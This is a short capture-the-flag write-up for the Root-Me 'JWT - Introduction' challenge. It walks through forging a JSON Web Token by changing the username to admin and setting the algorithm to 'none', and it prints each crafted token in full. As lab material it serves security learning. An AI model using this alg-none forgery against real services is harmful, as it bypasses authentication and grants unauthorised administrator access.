
[JWT - Introduction](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)
for this level we know that we should deal with the jwt.
so first get the jwt via burp or from the storage in devtool.
this is the first jwt token :
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk`
after encoding we have this :
HEADER : 
```text
{
  "typ": "JWT",
  "alg": "HS256"
}
```
PAYLOAD : 
```text
{
  "username": "guest"
}
```
so first try is to make the username to admin so we do it and with replacing the middle part of the original jwt we get this token :
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk`
after encoding we have this : 
HEADER : 
```text
{
  "typ": "JWT",
  "alg": "HS256"
}
```
PAYLOAD : 
```text
{

  "username": "admin"

}
```
when we use this on the challenge using burp repetear or changing the value of jwt cookie on the browser we get `Wrong Signature`, so the other idea is try to make the alg to none.
so we change the first section of the original token and we have this token : 
`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk`
after encoding we have this :
HEADER : 
```
{
  "typ": "JWT",
  "alg": "none"
}
```
PAYLOAD : 
```
{
  "username": "admin"
}
```
so we try this and we get the password.

---
